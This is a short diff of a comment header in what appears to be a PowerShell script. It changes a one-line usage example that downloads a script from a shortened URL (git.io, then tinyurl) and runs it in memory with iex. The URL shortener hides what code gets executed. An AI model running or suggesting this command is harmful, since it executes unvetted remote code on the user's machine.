@@ -9,7 +9,7 @@
 #
 #	Addition: One command to rule them all, One command to find it, and One command to Run it! 
 #
-#     > powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://git.io/JUfcc')"
+#     > iex(New-Object Net.WebClient).DownloadString('https://tinyurl.com/5f64m6dz')
 #
 #	Verathor Additions:
 #
